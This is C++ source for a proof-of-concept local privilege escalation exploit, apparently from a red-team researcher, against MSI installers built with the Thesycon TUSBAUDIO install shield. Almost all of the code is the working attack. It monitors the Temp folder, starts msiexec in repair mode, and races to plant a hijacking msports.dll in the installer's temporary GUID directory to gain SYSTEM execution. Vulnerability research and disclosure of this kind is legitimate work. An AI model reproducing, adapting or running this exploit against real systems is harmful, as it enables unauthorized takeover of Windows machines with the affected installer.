#include <windows.h>
#include <winbase.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <pathcch.h>
#include <Shlwapi.h>
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")
#include "stdafx.h"


// This is TUSBAUDIO installer race condition LPE exploit.
// Developed by Julian Horoszkiewicz (Eviden Red Team).
// Code based on https://learn.microsoft.com/en-us/windows/win32/fileio/obtaining-directory-change-notifications and https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory.
// Successfully tested on JDSLabs_UsbAudio_v5.58.0_2023-05-25.msi (https://www.virustotal.com/gui/file/4c105b801722c22d9455e09f8f7bc4d1104714354d7c903e11a8c34415a5fd98), the exploit should work on any MSI files created with this install shield (signed by Thesycon Software Solutions GmbH & Co. KG).

// The algorithm is pretty simple and goes like this:
// 1. Set up a watch notification on AppData\Local\Temp (to detect new directory creation)
// 2. Once notification hits, iterate over results. Pick up any directories that start with "{" and are 38-characters long.
// 3. Deploy our DLL as MSPORTS.DLL into the newly discovered directory (that alone should be enough to attain execution, by hijacking DLL search order - no need to overwrite anything).
// 4. Sleep for 20 seconds and check for the existence of C:\Users\Public\poc.txt.

void WatchTempDirectory(LPTSTR);
void deploy_payload(LPTSTR);

HANDLE hFind = INVALID_HANDLE_VALUE;

TCHAR LOCALAPPDATA[MAX_PATH];

TCHAR TLSETUPFX_TEMP_DIRNAME[MAX_PATH];
TCHAR DLL_PATH[MAX_PATH];
TCHAR DLL_DEPLOY_PATH[MAX_PATH];
TCHAR CURRENT_DIR[MAX_PATH];
TCHAR TLSETUPFX_TEMP_DIRMASK[MAX_PATH];
TCHAR TLSETUPFX_MSI_FILE[MAX_PATH];
TCHAR MSIEXEC_COMMAND_LINE[MAX_PATH];

WIN32_FIND_DATA ffd;

DWORD dwError = 0;

char* DLL_BUFFER;
int WRITE_ATTEMPT_COUNT = 0;
int THREAD_COUNT = 0;
int MAX_OVERWRITE_ATTEMPTS = 250;
int SCAN_FAIL_COUNT = 0;
int SCAN_FAIL_MAX = 100;
int FILE_CHECK_COUNT = 0;
int MAX_FILE_CHECK_COUNT = 500;
size_t DLL_BUFF_LENGTH = 0;

void _tmain(int argc, TCHAR* argv[])
{
    if (argc != 2)
    {
        _tprintf(TEXT("\nUsage: %s PATH_TO_TLSETUPFX_INSTALLER_FILE.msi\n\n"), argv[0]);
        ExitProcess(1);
    }

    if (!PathFileExists(argv[1])) // check if the provided file exists
    {
        _tprintf(TEXT("\nFatal: provided %s MSI file does not exist!\n\n"), argv[1]);
        ExitProcess(1);
    }
    StringCchCopy(TLSETUPFX_MSI_FILE, MAX_PATH, argv[1]);
    _tprintf(TEXT("\nObtaining the TEMP environmental variable... "));
    GetEnvironmentVariable(TEXT("TEMP"), LOCALAPPDATA, MAX_PATH); // C:\Users\user\AppData\Local\Temp is what we're looking for
    _tprintf(TEXT("Done: "));
    _tprintf(TEXT("\nPress any key to start the exploitation process... \n"));
    DeleteFile(TEXT("C:\\Users\\Public\\poc.txt")); // remnove old poc.txt if exists...
//  scanning for the TLSETUPFX temporary installer directory (then run the installer in repair mode in a separate window...
    char g;
    getc(stdin);

    // READ THE raw.dll file into memory
    _tprintf(TEXT("Loading raw.dll into memory (a proxy DLL for msports.dll, we're going to hijack the intsaller locally)...\n"));
    size_t path_len = 0;
    GetModuleFileName(NULL, CURRENT_DIR, MAX_PATH);
    StringCchLengthW(CURRENT_DIR, MAX_PATH, &path_len);
    PathCchRemoveFileSpec(CURRENT_DIR, path_len);
    StringCchCat(DLL_PATH, MAX_PATH, CURRENT_DIR);
    StringCchCat(DLL_PATH, MAX_PATH, TEXT("\\raw.dll"));
    
    HANDLE fileHandle = CreateFile(DLL_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("\nFatal: failed to open %s DLL file for reading!"),DLL_PATH);
        ExitProcess(1);
    }
    // Get the file size
    DLL_BUFF_LENGTH = GetFileSize(fileHandle, NULL);
    // Read the file contents into a buffer
    DLL_BUFFER = new char[DLL_BUFF_LENGTH];
    DWORD bytesRead;
    if (!ReadFile(fileHandle, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesRead, NULL)) {
        _tprintf(TEXT("\nFailed to read the %s DLL file!"),DLL_PATH);
        delete[] DLL_BUFFER;
        CloseHandle(fileHandle);
        ExitProcess(1);
    }
    _tprintf(TEXT("Done (%dw bytes of DLL file read, file size and DLL_BUFFER size: %d).\nStarting to watch for directory changes."), bytesRead, DLL_BUFF_LENGTH);
  
    // Start the installer, watch the AppData\Local\TempMoved for changes - once the first ns* directory is created, create a phantom in AppData\Local\TempNew, deploy StdUtils.dll and switch the path by removing and recreating the directory junction.

    StringCchCopy(TLSETUPFX_TEMP_DIRMASK, MAX_PATH, LOCALAPPDATA);
    StringCchCat(TLSETUPFX_TEMP_DIRMASK, MAX_PATH, TEXT("\\{*"));
    WatchTempDirectory(LOCALAPPDATA);
}
void start_msiexec()
{
    StringCchCopy(MSIEXEC_COMMAND_LINE, MAX_PATH, TEXT("msiexec.exe /fa "));
    StringCchCat(MSIEXEC_COMMAND_LINE, MAX_PATH, TLSETUPFX_MSI_FILE);
    _tprintf(TEXT("Starting %s...\n"), MSIEXEC_COMMAND_LINE);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    // Start the child process. 
    if (!CreateProcess(NULL,   // No module name (use command line)
        MSIEXEC_COMMAND_LINE,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d). Exiting!\n", GetLastError());
        ExitProcess(1);
    }
    _tprintf(TEXT("Done...\n"));
}
void WatchTempDirectory(LPTSTR lpDir) // C:\Users\kate\AppData\Local\Temp
{
   _tprintf(TEXT("Starting to watch %s.\n"),lpDir);
   BOOL target_found = FALSE;
// Watch the subtree for directory creation and deletion. 
// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstchangenotificationa
   DWORD dwWaitStatus; 
   HANDLE dwChangeHandle; 

   dwChangeHandle = FindFirstChangeNotificationW(lpDir, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME); // watch file name changes
   if(dwChangeHandle == INVALID_HANDLE_VALUE) 
   {
     printf("\n ERROR: FindFirstChangeNotification function failed.\n");
     ExitProcess(GetLastError()); 
   }
   if(dwChangeHandle == NULL)
   {
     printf("\n ERROR: Unexpected NULL from FindFirstChangeNotification.\n");
     ExitProcess(GetLastError()); 
   }
   _tprintf(TEXT("\nDIR being watched: %s\n"), lpDir);
   start_msiexec(); // STARTING MSIEXEC PROCESS
   //printf("\nStarting f filesystem notification...\n");
   dwWaitStatus = WaitForSingleObject(dwChangeHandle, INFINITE); // catch first change notification when the MSI* temp directory is created, then ignore it and set up another notification
   if (dwWaitStatus != WAIT_OBJECT_0)
   {
       _tprintf(TEXT("\nError (dwWaitStatus: %d) when trying to catch directory creation event in %s, this should not happen, exiting...\n"), lpDir);
       ExitProcess(GetLastError());
   }

   _tprintf(TEXT("\nChange notification for %s received (most likely the temporary 38-char directory was created), checking...\n"), lpDir);

   while (target_found==FALSE && SCAN_FAIL_COUNT<SCAN_FAIL_MAX) 
   { 
      // Wait for notification.      
      //printf("Got some!\n");
      //_tprintf(TEXT("Looking for %s directory...\n"), TLSETUPFX_TEMP_DIRMASK);
      switch (dwWaitStatus) 
      { 
         case WAIT_OBJECT_0: 
             //printf("A directory was created, renamed, or deleted.\n"); // OK, this is working, so far so good!
             // now, check if it appears to be a TLSETUPFX temp directory (based on the prefix), and if so - dive into watching it - or maybe even scan it for files already without waiting for further notifications (if our first approach fails, we will attempt to remove the directory already at this stage)

             hFind = FindFirstFile(TLSETUPFX_TEMP_DIRMASK, &ffd); 
             
             if (INVALID_HANDLE_VALUE == hFind)
             {
                 SCAN_FAIL_COUNT++;
                _tprintf(TEXT("INVALID_HANDLE received from FindFirstNotification, ignoring for the %d time..."),SCAN_FAIL_COUNT); // 
                continue;
             }
             // List all the files in the directory with some info about them.
            do
            {
                _tprintf(TEXT("Processing entry: ")); // DEBUG
                _tprintf(ffd.cFileName); // DEBUG
                _tprintf(TEXT("\n")); // DEBUG
                if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && lstrlen(ffd.cFileName) == 38) // if it's a directory - which is what we want
                {
                    target_found = TRUE;
                    StringCchCopy(TLSETUPFX_TEMP_DIRNAME, MAX_PATH, LOCALAPPDATA);
                    StringCchCat(TLSETUPFX_TEMP_DIRNAME, MAX_PATH, TEXT("\\"));
                    StringCchCat(TLSETUPFX_TEMP_DIRNAME, MAX_PATH, ffd.cFileName);                    
                    _tprintf(TEXT("Discovered 38-character directory named %s, good.\n"),TLSETUPFX_TEMP_DIRNAME);
                    StringCchCopy(DLL_DEPLOY_PATH, MAX_PATH, TLSETUPFX_TEMP_DIRNAME);
                    StringCchCat(DLL_DEPLOY_PATH, MAX_PATH, TEXT("\\msports.DLL")); // also try newdev.dll and propsys.dll, we already tried MSPORTS.dll  - they all exist in system32 and are signed
                    deploy_payload(DLL_DEPLOY_PATH);
                }
            } while (FindNextFile(hFind, &ffd) != 0);
            dwError = GetLastError();
            if (dwError != ERROR_NO_MORE_FILES)
            {
                _tprintf(TEXT("\nERROR_NO_MORE_FILES\n\n"));
            }
            FindClose(hFind);
            if (target_found == FALSE) // if our target directory still was not found - this might happen if we scan the directory too early
            {
                SCAN_FAIL_COUNT++;
                if(SCAN_FAIL_COUNT < SCAN_FAIL_MAX)
                {
                    _tprintf(TEXT("Could not find the target directory, repeating the loop for the %d time...\n"), SCAN_FAIL_COUNT); // 
                    continue;
                }
                else
                {
                    _tprintf(TEXT("Could not find the target directory, reached maximum re-scan attempts, giving up.\n"), SCAN_FAIL_COUNT); // 
                    break;
                }
            }            
            printf("Exiting.\n");
            ExitProcess(dwError); //
            break; 
         case WAIT_TIMEOUT:
         // A timeout occurred, this would happen if some value other 
         // than INFINITE is used in the Wait call and no changes occur.
         // In a single-threaded environment you might not want an
         // INFINITE wait.
            printf("\nNo changes in the timeout period (this should not happen, as we passed INIFINITE to WaitForSingleObject().\n");
            break;
         default: 
            printf("\n ERROR: Unhandled dwWaitStatus.\n");
            ExitProcess(GetLastError());
            break;
      }
   }
}
void deploy_payload(LPTSTR target_filename) // second version, let's try writing into it, hopefully this will be faster than trying to replace the file instead...
{
    WRITE_ATTEMPT_COUNT = 0;
    FILE_CHECK_COUNT = 0;
    while(WRITE_ATTEMPT_COUNT<MAX_OVERWRITE_ATTEMPTS)
    {
        WRITE_ATTEMPT_COUNT++;
        HANDLE outFile = CreateFile(target_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(outFile == INVALID_HANDLE_VALUE)
        {
            
            _tprintf(TEXT("Failed to write the %s file (%d attempt)!\n"),target_filename,WRITE_ATTEMPT_COUNT); // since we are now writing into our own new directory, this should not happen
            continue;
        }
        // Write binary data to the file
        DWORD bytesWritten;
        if(!WriteFile(outFile, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesWritten, NULL)) 
        {
            _tprintf(TEXT("Failed to write into %s file!\n"),target_filename);
            CloseHandle(outFile);
        }
        else
        {
            _tprintf(TEXT("File %s overwritten (%d bytes written)!\n"), target_filename, bytesWritten);
            CloseHandle(outFile);
            break; // having this successfully file overwritten once should do the trick, further attempts will only thwart the exploitation process by
            // potentially triggering SHARING VIOLATION errors to the installer
        }
    }
    _tprintf(TEXT("Sleeping 20 seconds before checking for poc.txt...\n"));
    Sleep(20000);
    if (PathFileExists(TEXT("C:\\Users\\Public\\poc.txt")))
    {
        printf("\n\nGOT SYSTEM BABY!!! C:\\Users\\Public\\poc.txt was created!\n\n");
    }
    else
    {
        printf("Exploitation failed. Exiting!\n");
    }
    ExitProcess(0);
}